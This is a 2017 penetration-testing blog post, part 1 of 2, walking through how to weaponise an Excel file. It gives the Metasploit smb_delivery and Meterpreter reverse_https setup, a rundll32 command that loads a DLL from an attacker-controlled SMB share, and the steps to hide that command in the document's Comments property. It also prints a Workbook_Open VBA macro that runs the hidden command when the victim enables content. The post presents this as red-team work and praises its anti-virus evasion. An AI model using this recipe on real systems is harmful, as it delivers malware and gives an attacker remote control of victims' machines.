---
title: "Executing Metasploit & Empire Payloads from MS Office Document Properties (part 1 of 2)"
date: 2017-12-06
draft: false
toc: false
images:
  - "/wp-content/uploads/2017/12/Metasploit-1.png"
categories:
  - Security
tags:
  - Empire
  - metasploit
  - Penetration Testing
  - Red Teaming
---
<p> </p>
<p>As a penetration tester I’m always excited to see new and creative methods on creating weaponized MS Office documents.  This blog post builds on the following findings published by Black Hills InfoSec: <a href="https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/">https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/</a></p>
<p>There are numerous ways on how MS Office documents can be abused and weaponised to deliver a variety of cyber-related attacks.  This blog post will demonstrate how quickly and easy it is to hide a Metasploit and Empire payload within a MS Office document and execute it from an embedded Macro.</p>
<p><strong>Metasploit:</strong></p>
<p>In the first example I’m going to use a payload generated with Metasploits ‘SMB Delivery’ functionality to Weaponise a MS Excel document.  The ‘SMB Delivery’ is a personal favourite of mine given its simplicity and subtle anti-virus evasion.</p>
<p>Begin by loading the relevant module into Metasploit:</p>
<pre class="lang:default decode:true ">use exploit/windows/smb/smb_delivery</pre>
<p> </p>
<p><em> </em></p>
<p><em> <a href="/wp-content/uploads/2017/12/ks-msf1.jpg"><img decoding="async" class="alignnone wp-image-1526 size-full" src="/wp-content/uploads/2017/12/ks-msf1.jpg" alt="" width="600" height="292" srcset="/wp-content/uploads/2017/12/ks-msf1.jpg 600w, /wp-content/uploads/2017/12/ks-msf1-300x146.jpg 300w" sizes="(max-width: 600px) 100vw, 600px"></a></em></p>
<p> </p>
<p>Set the payload to anything you desire, in this example I’ll be using the Windows Meterpreter Reverse HTTPS payload:</p>
<pre class="lang:default decode:true ">set PAYLOAD windows/meterpreter/reverse_https</pre>
<p> </p>
<p><em> </em></p>
<p><a href="/wp-content/uploads/2017/12/ks-msf2.jpg"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-1527" src="/wp-content/uploads/2017/12/ks-msf2.jpg" alt="" width="602" height="272" srcset="/wp-content/uploads/2017/12/ks-msf2.jpg 602w, /wp-content/uploads/2017/12/ks-msf2-300x136.jpg 300w" sizes="auto, (max-width: 602px) 100vw, 602px"></a></p>
<p> </p>
<p>Finally, issue the ‘<em>exploit</em>’ command to begin staging the attack:</p>
<p><a href="/wp-content/uploads/2017/12/ks-msf3.jpg"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-1528" src="/wp-content/uploads/2017/12/ks-msf3.jpg" alt="" width="568" height="129" srcset="/wp-content/uploads/2017/12/ks-msf3.jpg 568w, /wp-content/uploads/2017/12/ks-msf3-300x68.jpg 300w" sizes="auto, (max-width: 568px) 100vw, 568px"></a></p>
<p> </p>
<p>Now, in order to utilise this, we will need execute the following command on the victim host:</p>
<pre class="lang:default decode:true ">rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0</pre>
<p> </p>
<p><em> </em></p>
<p><strong>Note: the folder path is randomly generated as we didn’t explicitly define it within the Metasploit options</strong></p>
<p>In order to achieve this, we’re going to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro.  This can easily be done by using the Powershell script: ‘Commentator’ (<a href="https://github.com/clr2of8/Commentator">https://github.com/clr2of8/Commentator</a>)</p>
<p> </p>
<p>Begin by starting PowerShell:</p>
<pre class="lang:default decode:true ">powershell.exe -exec bypass</pre>
<p> </p>
<p><em> </em></p>
<p>Import the module into your PowerShell environment:</p>
<pre class="lang:default decode:true ">Import-Module .\Commentator.ps1</pre>
<p> </p>
<p><em> </em></p>
<p>And execute the script to embed our payload into the ‘comments’ property of the MS Excel document:</p>
<pre class="lang:default decode:true ">Invoke-Commentator -OfficeFile .\msf_smb_delivery.xlsx -Comment "rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0"</pre>
<p> </p>
<p><em> </em></p>
<p><em> </em></p>
<p>After successful execution, a copy of your existing MS Office file will be created with the payload embedded:</p>
<p><em>The new file with added comment has been written to .\msf_smb_delivery-wlc.xlsx.</em></p>
<p><em>DONE!</em></p>
<p>This can be verified by inspecting the file’s metadata / properties:</p>
<p><a href="/wp-content/uploads/2017/12/ks-msf4.jpg"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-1529" src="/wp-content/uploads/2017/12/ks-msf4.jpg" alt="" width="271" height="383" srcset="/wp-content/uploads/2017/12/ks-msf4.jpg 271w, /wp-content/uploads/2017/12/ks-msf4-212x300.jpg 212w" sizes="auto, (max-width: 271px) 100vw, 271px"></a></p>
<p> </p>
<p>Lastly, in order to execute the payload embedded within the ‘comments’ property, the following embedded Macro can be used:</p>
<p><em> </em></p>
<pre class="lang:default decode:true ">Sub Workbook_Open()

Dim p As DocumentProperty

 

 For Each p In ActiveWorkbook.BuiltinDocumentProperties

    If p.Name = "Comments" Then

        Shell (p.Value)

    End If

 Next

End Sub</pre>
<p> </p>
<p> </p>
<p> </p>
<p><strong>Note: In order to utilise auto-execution via the ‘<em>Workbook_Open()</em>’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)</strong></p>
<p><a href="/wp-content/uploads/2017/12/ks-msf5.jpg"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-1530" src="/wp-content/uploads/2017/12/ks-msf5.jpg" alt="" width="601" height="231" srcset="/wp-content/uploads/2017/12/ks-msf5.jpg 601w, /wp-content/uploads/2017/12/ks-msf5-300x115.jpg 300w" sizes="auto, (max-width: 601px) 100vw, 601px"></a></p>
<p>After the victim has clicked ‘enable editing’ and ‘enable content’, a Meterpreter session should appear:</p>
<p><em> <a href="/wp-content/uploads/2017/12/ks-msf6.jpg"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-1531" src="/wp-content/uploads/2017/12/ks-msf6.jpg" alt="" width="661" height="104" srcset="/wp-content/uploads/2017/12/ks-msf6.jpg 661w, /wp-content/uploads/2017/12/ks-msf6-300x47.jpg 300w" sizes="auto, (max-width: 661px) 100vw, 661px"></a></em></p>
        <h3 class="awpa-title">About The Author</h3>
                        <div class="wp-post-author-wrap wp-post-author-shortcode left">
                                                                <div class="awpa-tab-content active" id="1_awpa-tab1">
                                    <div class="wp-post-author">
            <div class="awpa-img awpa-author-block square">
                <a href="/author/jps_admin/"><img alt="" src="https://secure.gravatar.com/avatar/e81af0ed037c0b2a88af1d9d8d4be2515f721f9b7ccf9ae910576d539feff4fb?s=150&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/e81af0ed037c0b2a88af1d9d8d4be2515f721f9b7ccf9ae910576d539feff4fb?s=300&amp;d=mm&amp;r=g 2x" class="avatar avatar-150 photo" height="150" width="150"></a>
               
               
            </div>
            <div class="wp-post-author-meta awpa-author-block">
                <h4 class="awpa-display-name">
                    <a href="/author/jps_admin/">Smittix</a>
                    
                </h4>
                

                
                <div class="wp-post-author-meta-bio">
                                    </div>
                <div class="wp-post-author-meta-more-posts">
                    <p class="awpa-more-posts round">
                        <a href="/author/jps_admin/" class="awpa-more-posts">See author's posts</a>
                    </p>
                </div>
                                    <ul class="awpa-contact-info round">
                                                    
                                <li class="awpa-website-li">
                                    <a href="/" class="awpa-website awpa-icon-website"></a>
                                </li>
                                                                                                                                                                                        </ul>
                            </div>
        </div>

                                </div>
                                                            </div>
                        

        <div class="post-share">
            <div class="post-share-icons cf"> 
                                    <a class="facebook" href="https://www.facebook.com/sharer.php?u=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/" target="_blank">
                        <i class="fab fa-facebook"></i>
                    </a>
                                    <a class="x-twitter" href="http://twitter.com/share?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;text=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29" target="_blank">
                        <i class="fa-brands fa-x-twitter"></i>
                    </a>
                                    <a class="envelope" href="mailto:?subject=Executing%20Metasploit%20%26amp;%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20(part%201%20of%202)&amp;body=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/" target="_blank">
                        <i class="fas fa-envelope-open"></i>
                    </a>
                                    <a class="linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29" target="_blank">
                        <i class="fab fa-linkedin"></i>
                    </a>
                                    <a href="javascript:pinIt();" class="pinterest">
                        <i class="fab fa-pinterest"></i>
                    </a>
                                    <a class="telegram" href="https://t.me/share/url?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29" target="_blank">
                        <i class="fab fa-telegram"></i>
                    </a>
                                    <a class="whatsapp" href="https://api.whatsapp.com/send?text=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29" target="_blank">
                        <i class="fab fa-whatsapp"></i>
                    </a>
                                    <a class="reddit" href="https://www.reddit.com/submit?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29" target="_blank">
                        <i class="fab fa-reddit"></i>
                    </a>
                                <a class="print-r" href="javascript:window.print()"> <i class="fas fa-print"></i></a>
            </div>
        </div>
                        <div class="clearfix mb-3"></div>
                    
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="/posts/reporting-ssltls-issues-the-easy-way-with-yanp/" rel="prev"><div class="fas fa-angle-double-left"></div><span> Reporting SSL/TLS Issues the Easy Way with YANP</span></a></div><div class="nav-next"><a href="/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/" rel="next"><span>Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2) </span><div class="fas fa-angle-double-right"></div></a></div></div>
	</nav>
